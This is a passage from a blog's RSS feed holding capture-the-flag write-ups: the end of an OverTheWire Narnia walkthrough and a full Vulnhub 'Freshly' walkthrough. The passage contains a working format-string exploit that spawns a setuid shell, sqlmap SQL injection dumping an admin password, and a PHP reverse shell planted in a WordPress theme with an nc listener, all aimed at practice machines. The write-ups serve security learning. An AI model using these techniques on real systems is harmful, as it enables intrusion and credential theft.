0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
(gdb) c
Continuing.
Way to go!!!!$
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;And now we need to run it from the commandline to actually get a proper setuid shell&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia7@melinda:/narnia$ .//narnia7 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa\x0c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@melinda:/narnia$ .//narnia7 &lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;aaaa\x1c\xd6\xff\xff&amp;#39; + &amp;#39;%x&amp;#39;*5 + &amp;#39;%134514399d%n&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whomai
/bin/sh: 1: whomai: not found
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8 
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Notice that the address of &lt;code&gt;ptrf&lt;/code&gt; is not the same in the shell :)&lt;/p&gt;

&lt;h2 id=&#34;level-08:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 08&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// gcc&amp;#39;s variable reordering fucked things up&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// to keep the level in its old style i am &lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// making &amp;quot;i&amp;quot; global unti i find a fix &lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;// -morla &lt;/span&gt;
&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i;&lt;/span&gt; 

&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;func&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;b){&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;blah&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;b;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;bok[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color: #75715e&#34;&gt;//int i=0;&lt;/span&gt;
    
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(bok,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(bok));&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;blah[i]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;bok[i]&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;blah[i];&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,bok);&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv){&lt;/span&gt;
        
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;       
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;func(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;    
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s argument&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m struggling with this, and rather than delay the whole post because of the last
level, I decided to post anyway. I&amp;rsquo;ll update this when I have this figured out.&lt;/p&gt;

&lt;p&gt;Sorry.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Vulnhub&#39;s &#39;TopHatSec Freshly&#39;</title>
      <link>https://svenito.github.io/nowhere/2015/04/11/vulnhubs-freshly/</link>
      <pubDate>Sat, 11 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/04/11/vulnhubs-freshly/</guid>
      <description>&lt;p&gt;This is my first writeup of a &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&lt;/a&gt; wargame: Freshly.&lt;/p&gt;

&lt;p&gt;The challenge is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;The goal of this challenge is to break into the machine via 
the web and find the secret hidden in a sensitive file. 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go grab the image and follow along.&lt;/p&gt;

&lt;p&gt;First I need to determine the image&amp;rsquo;s IP address and what services it is running:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sn 192.168.56.0/24

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00088s latency).
MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds
root@kali:~# nmap -p- 192.168.56.103

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I can see the host is at &lt;code&gt;192.168.56.103&lt;/code&gt; and has ports &lt;em&gt;80, 443, and 8080&lt;/em&gt;
open. Browsing to the address presents an animated gif.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qgkgkgg.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;My initial reaction is
to look at the source, but here I only see the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag and the image filename.
The image filename could be useful later, but right now I see no use for it.&lt;/p&gt;

&lt;p&gt;In that case let&amp;rsquo;s see if the SSL port holds anything more interesting.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/wvHo8ru.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Nice, looks like I&amp;rsquo;m getting somewhere. I follow this link to a wordpress site
which sells candy. Generally browsing the site I notice it&amp;rsquo;s a Bitnami install
of a Wordpress site, running a few plugins.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SHEXup3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Before I start work on that, let me just see what&amp;rsquo;s at port &lt;em&gt;8080&lt;/em&gt;. Ah, it&amp;rsquo;s a
non &lt;em&gt;https&lt;/em&gt; version of the wordpress site. I&amp;rsquo;m going to use that instead
of the &lt;em&gt;https&lt;/em&gt; version to avoid any certificate issues and generally make life
a bit easier.&lt;/p&gt;

&lt;p&gt;Using &lt;code&gt;wpscan&lt;/code&gt; I can find out which of the installed plugins have vulnerabilities.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &amp;#39;_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.6
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.56.103:8080/wordpress/
[+] Started: Fri Apr 10 18:42:00 2015

[!] The WordPress &amp;#39;http://192.168.56.103:8080/wordpress/readme.html&amp;#39; file exists exposing a version number
[!] Full Path Disclosure (FPD) in: &amp;#39;http://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php&amp;#39;
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: http://192.168.56.103:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1 identified from meta generator

[+] Enumerating installed plugins (only vulnerable ones) ...

   Time: 00:01:40 &amp;lt;============================================&amp;gt; (952 / 952) 100.00% Time: 00:01:40

[+] We found 4 plugins:

[+] Name: cart66-lite - v1.5.3
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: google-analytics-for-wordpress - v5.3.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: http://packetstormsecurity.com/files/130716/
    Reference: http://osvdb.org/119334

[+] Name: proplayer - v4.7.9.1
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: http://osvdb.org/93564
    Reference: http://www.exploit-db.com/exploits/25605/

[+] Name: wptouch - v3.6.6
 |  Location: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/
 |  Readme: http://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt

[!] Title: WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7

[+] Finished: Fri Apr 10 18:43:48 2015
[+] Memory used: 9.027 MB
[+] Elapsed time: 00:01:48
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There&amp;rsquo;s a few there, so I&amp;rsquo;ll look at each on in turn to see how easy it is to
exploit, and what it might yield.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Cart66 Lite &amp;lt;= 1.5.3 - SQL Injection&lt;/p&gt;

&lt;p&gt;This requires the user to be logged in, and seeing as I don&amp;rsquo;t have a login
I won&amp;rsquo;t get very far with this.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS) ###&lt;/p&gt;

&lt;p&gt;This requires admin access to the site, in order to configure the plugin.
Another dead end.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;ProPlayer 4.7.9.1 - SQL Injection&lt;/p&gt;

&lt;p&gt;Not much luck with this. Although it doesn&amp;rsquo;t require a login, I wasn&amp;rsquo;t
successful with getting anything out of it.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;WPtouch &amp;lt;= 3.6.6 - Unvalidated Open Redirect&lt;/p&gt;

&lt;p&gt;I doubt that an unvalidated redirect will be of much use here.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ok, thinking cap back on&amp;hellip;. I need a different angle of attack.&lt;/p&gt;

&lt;p&gt;Revisiting the main wordpress site there is something a bit unusual.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/2ddRfdF.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Did I miss something? Did I get done by a Jedi mindtrick? Let&amp;rsquo;s see. I&amp;rsquo;ll
head back to the main site and try and find some other pages with &lt;em&gt;DirBuster&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is how I set it up&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/auVPaoO.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Using this list I got lucky and received two interesting hits after short while&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/l647X5u.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve decided to hold back on on the &lt;code&gt;phpmyadmin&lt;/code&gt; and investigate the &lt;code&gt;login.php&lt;/code&gt;
first. This is what lies at the end of that URL&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/c8aSx4n.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I could just start attacking this with various SQLi strings, but the
beauty of attacking a virtual machine is that I can use tools without the fear
of breaking someone else&amp;rsquo;s stuff. Roll out &lt;code&gt;sqlmap&lt;/code&gt; and let&amp;rsquo;s see what we can find:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt;

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;user&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

POST parameter &amp;#39;password&amp;#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

&amp;lt;snip&amp;gt;

[12:17:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve removed some of the output for clarity, but I can see
that there&amp;rsquo;s possibility of a blind SQL injection for both &lt;code&gt;user&lt;/code&gt; and
&lt;code&gt;password&lt;/code&gt; and that it&amp;rsquo;s a MySQL databse. Great.
We can carry on using &lt;code&gt;sqlmap&lt;/code&gt; to try and discover
what tables there are and if we can find any useful information.&lt;/p&gt;

&lt;p&gt;First I&amp;rsquo;ll get a list of databases on the system. This process takes a little while,
so when it asks &amp;ldquo;&lt;em&gt;do you want sqlmap to try to optimize value(s) for DBMS delay
responses (option &amp;lsquo;&amp;ndash;time-sec&amp;rsquo;)? [Y/n]&lt;/em&gt;&amp;rdquo; answer &lt;em&gt;YES&lt;/em&gt;. It will be done quicker.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dbs

&amp;lt;snip&amp;gt;

[12:20:19] [INFO] fetching database names
[12:20:19] [INFO] fetching number of databases
[12:20:19] [INFO] retrieved: 7
[12:20:21] [INFO] retrieved: information_schema
[12:21:36] [INFO] retrieved: login
[12:21:59] [INFO] retrieved: mysql
[12:22:20] [INFO] retrieved: performance_schema
[12:23:33] [INFO] retrieved: phpmyadmin
[12:24:18] [INFO] retrieved: users
[12:24:43] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

[12:25:44] [INFO] fetched data logged to text files under &amp;#39;/root/.sqlmap/output/192.168.56.103&amp;#39;

[*] shutting down at 12:25:44
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;It found seven databases, amongst which is an interesting one: &lt;code&gt;wordpress8080&lt;/code&gt;.
This seems to be the wordpress database, so I can start attacking that and see
if I can get the &lt;em&gt;admin&lt;/em&gt; account. The &lt;code&gt;login&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt; databases also look
interesting, so let&amp;rsquo;s take a look at those later. Additionally, if I can get
a login, especially an &lt;em&gt;admin&lt;/em&gt; one, I could try to exploit the plugins later on.
After all, it does say there are multiple ways into this VM.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --tables -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

root@kali:~# sqlmap  -u &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;192.168.56.103/login.php&amp;quot;&lt;/span&gt; --data&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;user=1&amp;amp;password=1&amp;amp;s=Submit&amp;quot;&lt;/span&gt; --dbms&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;mysql --dump -T users -D wordpress8080

&amp;lt;snip&amp;gt;

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;The admin password for the wordpress site, excellent. As for the other tables,
I didn&amp;rsquo;t find anything useful in them, so I won&amp;rsquo;t post the output here. In that case
I might aswell just login to the wordpress site now. Basically I have full control
of the wordpress site now, so what should I do? How does a PHP shell sound? Good?
Alright then&amp;hellip; &lt;code&gt;cd /usr/share/webshells/php&lt;/code&gt; and I&amp;rsquo;m going to use the
&lt;code&gt;php-reverse-shell.php&lt;/code&gt; and replace the site&amp;rsquo;s &lt;em&gt;404&lt;/em&gt; with that.&lt;/p&gt;

&lt;p&gt;To do that I need to edit the theme in the admin section, and just
paste in the contents. The I need to open a listening &lt;code&gt;netcat&lt;/code&gt; session and
browse to a non-existant page on the site.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:/usr/share/webshells/php# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can&amp;#39;t access tty; job control turned off
$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;cd&lt;/span&gt; /etc 
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# &lt;span style=&#34;color: #f8f8f2&#34;&gt;SECRET&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;I had to poke around the file system a bit to find this, but &lt;code&gt;/etc/passwd&lt;/code&gt; is
usually a &lt;em&gt;go-to&lt;/em&gt; file if you get access to a system. Otherwise I&amp;rsquo;d still
be looking for the file now :)&lt;/p&gt;

&lt;p&gt;So that&amp;rsquo;s one way to do it.&lt;/p&gt;

&lt;p&gt;This seems to be the most direct route in. It might be worth exploring the
vulnerabilities on the plugins, but it&amp;rsquo;s late now, so I&amp;rsquo;ll save that for
another time.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Narnia Part 1</title>
      <link>https://svenito.github.io/nowhere/2015/04/08/solving-narnia-part1/</link>
      <pubDate>Wed, 08 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/04/08/solving-narnia-part1/</guid>
      <description>

&lt;p&gt;Next up we take on &lt;a href=&#34;http://overthewire.org/wargames/narnia/&#34;&gt;Narnia&lt;/a&gt;. This is a
